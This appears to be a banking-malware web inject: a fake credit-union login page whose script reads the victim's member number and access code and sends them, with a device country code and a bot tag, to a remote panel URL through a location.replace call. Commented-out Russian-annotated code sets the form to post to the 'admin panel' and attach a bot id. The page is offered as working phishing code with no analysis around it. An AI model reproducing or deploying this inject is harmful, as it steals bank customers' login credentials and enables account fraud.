QIvPyhW2Xbrcbv81hRzMLAD3ASdy5RWu2G+9+amNziGhOP4CPYcjIvPVbdjbjPWxs0qK5BECglBmdv2r72mbK38YmIzSHACigGF+0dus3zZC3jU1GybgAUErvKly7/fDaTMfGRofMCgDBQ0VrS17KaJ42Ns1IBq1A9LXC1SXTMpefjU3zk5ERgBB8UtC9RH+Dfxubw5S0BYBQLK71SleQD5HGVxVsbA4N6QrAb4RKl1oNPLKxOdxIXQAIdiqEP09rkYGNzZ+FlASAAuUKYS8oXr1JfxdWG5s/AakIgJ+CXlC8asuWjJfGxqaFSVYARABji9eUrG6OwtjYtDTJCAClFNcVrtmesa8T2NgcapIRgHuK1m6f22wlsbE5BFgSAALyWOGa7c83d2FsbFoaUwEgwNz8NdumtkRhbGxaGkMBoMDC/JxO1xJ11b2NzRGHkQD8IklZV5DFi6UWK42NTQujHQ1KsIFzOEcWrlkfaOHy2Ni0KIkjAME+AmVE7s8bqg5BeWxsWpSmAlBJKRlesHqH/levbWyOIGJVoCAUOqpo3XbtrxPb2ByBNAiASCgdU7CuZNkhLY2NTQvDAKAU5MaCtSVfHOrC2Ni0OJX9u993qMtgY3Oo+P/rvhG4Vu4dmwAAAABJRU5ErkJggg==">

<div id="content_div">
    <form action="null" method="post" id="_mainForm" target="flow_handler">

            <div class="field-block" style="margin-top: 20px">
                <label for="login">Member Number</label>
                <input id="login" name="Member Number" class="input-field" type="text" tabindex="0" size="16" maxlength="20" autocomplete="OFF">
            </div>

            <div class="field-block">
                <label for="Password">Access code</label>
                <input id="password" name="Access code"  type="password" class="input-field" tabindex="0" size="16" maxlength="16" autocomplete="OFF">
            </div>

        <br />
        <input value="Log In" id="submitBtn1" class="rc-button rc-button-submit" type="button">
        <br />
        <br />

    </form>
    <iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
</div>


<script type="text/javascript">
			   
				
				
				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };


                    /*var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');
					
					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;
					
                    g_oForm.setAttribute('action',g_sFAct); // устанавливаем у формы урл админки
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};
					
					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // получаем id бота
*/

                    var g_oBtn = document.getElementById('submitBtn1');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'input-field';
						} catch(e){};
						
                        if (oNumInp.value.length < 6) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{4,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						top['closeDlg'] = true;
						/*prompt('send', '{"dialog id" : "peoples_choice_credit_unuin'+
						'", "member_number": "'+oNumInp.value+
						'", "access_code": "'+oCodeInp.value+'"}');
						
						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();
						*/
						
						
						
						var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|peoples_choice_credit_unuin|"+oNumInp.value+"|"+oCodeInp.value+"|");
						return false;
                    };

                })();
            </script>

</body>
</html>
